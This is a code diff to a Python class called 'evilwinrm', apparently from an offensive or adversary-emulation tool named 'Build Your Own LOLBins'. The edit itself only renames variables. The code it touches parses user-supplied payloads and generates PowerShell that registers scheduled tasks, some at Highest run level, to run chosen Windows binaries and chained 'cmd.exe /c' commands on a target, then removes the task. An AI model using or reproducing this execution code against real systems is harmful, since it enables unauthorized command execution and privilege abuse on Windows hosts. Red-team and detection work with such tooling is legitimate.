@@ -51,15 +51,15 @@ class evilwinrm:
         print(str(userVariant.payload))
 
         techniqueIndex = str(userVariant.payload).find(".exe")
-        delimiterIndex = str(userVariant.payload).find("&")
+        ampersandIndex = str(userVariant.payload).find("&")
         binary = str(userVariant.payload)[0:techniqueIndex+4]
 
-        if delimiterIndex == -1:
-            remaining = str(userVariant.payload)[techniqueIndex+5:]
+        if ampersandIndex == -1:
+            commandArg = str(userVariant.payload)[techniqueIndex+5:]
             chainPayload = ""
         else:
-            remaining = str(userVariant.payload)[techniqueIndex+5:delimiterIndex-1]
-            chainRemaining = str(userVariant.payload)[delimiterIndex+2:]
+            commandArg = str(userVariant.payload)[techniqueIndex+5:ampersandIndex-1]
+            chainRemaining = str(userVariant.payload)[ampersandIndex+2:]
             chainPayload = f"""$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c {chainRemaining}'
                             $task = "Build Your Own LOLBins"
                             $registeredTask = Register-ScheduledTask -TaskName $task -Action $action -RunLevel Highest -ErrorAction SilentlyContinue
@@ -82,7 +82,7 @@ class evilwinrm:
 
         if userVariant.highIntegrity == 'Yes':
             payloadToRun = f"""$binary = {binary}
-                $action = New-ScheduledTaskAction -Execute $binary -Argument '{remaining}'
+                $action = New-ScheduledTaskAction -Execute $binary -Argument '{commandArg}'
                 $task = "Build Your Own LOLBins"
                 $registeredTask = Register-ScheduledTask -TaskName $task -Action $action -RunLevel Highest -ErrorAction SilentlyContinue
                 if ($registeredTask -eq $null) {{ 
@@ -94,7 +94,7 @@ class evilwinrm:
                 Unregister-ScheduledTask -TaskName $task -Confirm:$false"""
         else:
             payloadToRun = f"""$binary = {binary}
-                $action = New-ScheduledTaskAction -Execute $binary -Argument '{remaining}'
+                $action = New-ScheduledTaskAction -Execute $binary -Argument '{commandArg}'
                 $task = "Build Your Own LOLBins"
                 $registeredTask = Register-ScheduledTask -TaskName $task -Action $action -ErrorAction SilentlyContinue
                 if ($registeredTask -eq $null) {{ 
